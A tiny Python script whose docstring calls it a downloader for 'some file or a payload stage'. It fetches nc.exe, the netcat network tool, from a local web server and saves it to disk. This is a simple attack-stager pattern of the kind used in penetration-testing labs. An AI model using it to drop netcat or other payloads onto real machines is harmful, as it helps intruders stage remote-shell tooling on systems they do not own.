'''
very simple script to download some file or a payload stage
'''

import requests

url = 'http://127.0.0.1/nc.exe'
filename = 'nc.exe'

response = requests.get(url)

#openfile in write binary mode
with open(filename, 'wb') as f:
    #write streamed content to local file
    f.write(response.content)

